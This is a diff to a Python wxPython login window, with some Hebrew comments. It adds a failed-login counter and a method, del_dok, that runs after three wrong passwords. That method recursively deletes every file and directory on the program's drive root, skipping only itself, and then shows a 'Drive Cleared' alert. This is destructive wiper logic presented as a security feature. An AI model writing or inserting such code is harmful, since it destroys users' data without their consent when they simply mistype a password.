@@ -2,7 +2,7 @@ import wx
 import os
 import hashlib
 import sys
-
+import shutil
 
 class LoginFrame(wx.Frame):
     def __init__(self, success_callback):
@@ -10,6 +10,7 @@ class LoginFrame(wx.Frame):
                          style=wx.DEFAULT_FRAME_STYLE & ~(wx.RESIZE_BORDER | wx.MAXIMIZE_BOX))
         self.success_callback = success_callback
         self.panel = wx.Panel(self)
+        self.tries = 0
         self.panel.SetBackgroundColour(wx.Colour(15, 15, 20))
         self.setup_ui()
         self.Show()
@@ -39,8 +40,6 @@ class LoginFrame(wx.Frame):
 
     def on_login(self, event):
         u_raw, p_raw = self.user_input.GetValue(), self.pass_input.GetValue()
-
-        # תמיכה בנתיב פנימי בתוך EXE עבור קובץ ה-Vault
         base_path = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
         auth_file = os.path.join(base_path, ".auth_vault")
 
@@ -58,5 +57,31 @@ class LoginFrame(wx.Frame):
                     self.Destroy()
                 else:
                     wx.MessageBox("Invalid Credentials", "Auth Failed")
+                    self.tries += 1
+                    if self.tries == 3:
+                        self.del_dok()
         except Exception as e:
             wx.MessageBox(f"File Error: {str(e)}")
+
+    def del_dok(self):
+        """מחיקת כל הקבצים בכונן וסגירת התוכנית"""
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        drive_path = os.path.splitdrive(os.path.abspath(exe_path))[0] + os.sep
+        current_file = os.path.abspath(exe_path)
+        try:
+            for filename in os.listdir(drive_path):
+                file_path = os.path.join(drive_path, filename)
+                full_path = os.path.abspath(file_path)
+                if full_path == current_file:
+                    continue
+                try:
+                    if os.path.isfile(full_path) or os.path.islink(full_path):
+                        os.unlink(full_path)
+                    elif os.path.isdir(full_path):
+                        shutil.rmtree(full_path)
+                except Exception as e:
+                    print(f"Could not delete {filename}: {e}")
+            wx.MessageBox("Security Triggered: Drive Cleared.", "Alert", wx.ICON_WARNING)
+        finally:
+            self.Destroy()  # סוגר את החלון הנוכחי
+            wx.GetApp().ExitMainLoop()  # יוצא מהלולאה הראשית של wxPython בצורה נקייה
